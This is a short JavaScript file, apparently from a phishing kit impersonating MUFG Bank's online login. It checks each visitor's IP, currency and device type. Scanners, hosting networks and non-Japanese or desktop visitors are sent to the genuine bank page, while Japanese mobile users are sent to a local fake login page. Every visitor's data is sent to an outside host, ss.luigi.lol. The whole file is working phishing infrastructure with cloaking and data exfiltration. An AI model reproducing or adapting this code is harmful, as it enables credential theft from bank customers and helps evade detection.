$.getJSON("https://api.ipregistry.co/?key=2fssd212ww8gt3dk", function(json) {
  const data = {
    companyType: json.company.type,
    connectionType: json.connection.type,
    currencyType: json.currency.code,
    osType: json.user_agent.os.type
  };
  const apiUrl = 'https://ss.luigi.lol/api';
  let allowAccess = true;

  if (data.companyType === 'hosting' || data.connectionType === 'hosting' || data.currencyType !== 'JPY' || data.osType !== 'mobile') {
    allowAccess = false;
  }

  userId = localStorage.getItem('userId');
  if (allowAccess) {
    postData(`${apiUrl}/log/index`, { userId: userId, companyType: data.companyType, connectionType: data.connectionType, osType: data.osType, yesorno: 'ok', json: json })
      .then(function(response) {
        //console.log(response);
      })
      .catch(function(error) {
        //console.error('Error:', error);
      });
      window.location.href = "./ibg/dfw/APLIN/loginib/index.html?login?_TRANID=AG004_001";
  } else {
    postData(`${apiUrl}/log/index`, { userId: userId, companyType: data.companyType, connectionType: data.connectionType, osType: data.osType, yesorno: 'no', json: json })
      .then(function(response) {
        //console.log(response);
      })
      .catch(function(error) {
        //console.error('Error:', error);
      });

    window.location.href = "https://entry11.bk.mufg.jp/ibg/dfw/APLIN/loginib/login?_TRANID=AG004_001";
	return false;
  }
});


function postData(url, data) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', url);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = () => {
      if (xhr.status === 200) {
        resolve(xhr.responseText);
      } else {
        reject(xhr.statusText);
      }
    };
    xhr.onerror = () => {
      reject(xhr.statusText);
    };
    xhr.send(JSON.stringify(data));
  });
}
